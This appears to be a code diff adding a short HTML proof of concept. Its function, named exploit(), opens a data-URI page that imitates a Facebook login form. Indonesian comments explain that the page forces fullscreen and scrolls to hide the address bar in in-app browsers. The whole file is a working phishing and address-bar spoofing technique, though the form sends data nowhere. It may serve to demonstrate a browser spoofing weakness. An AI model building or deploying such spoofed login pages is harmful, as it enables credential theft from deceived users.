@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="exploit()">Open Secure Page</button>
+<script>
+function exploit() {
+  // data URI biar nggak ada request, langsung render
+  const fakePage = `data:text/html,
+    <title>facebook.com</title>
+    <style>body{margin:0}</style>
+    <div style='background:#1877f2;color:white;padding:16px;font-family:Arial'>facebook</div>
+    <div style='padding:20px;font-family:Arial'>
+      <h3>Log in to Facebook</h3>
+      <input style='width:90%;padding:12px;margin:8px 0' placeholder='Email or phone'><br>
+      <input style='width:90%;padding:12px;margin:8px 0' placeholder='Password' type='password'>
+    </div>
+    <script>
+      // Auto fullscreen pas load
+      document.documentElement.requestFullscreen();
+      // Scroll biar address bar ilang di IAB
+      window.scrollTo(0,1);
+    <\/script>
+  `;
+  
+  const w = window.open(fakePage, '_blank');
+}
+</script>
+</body>
+</html>
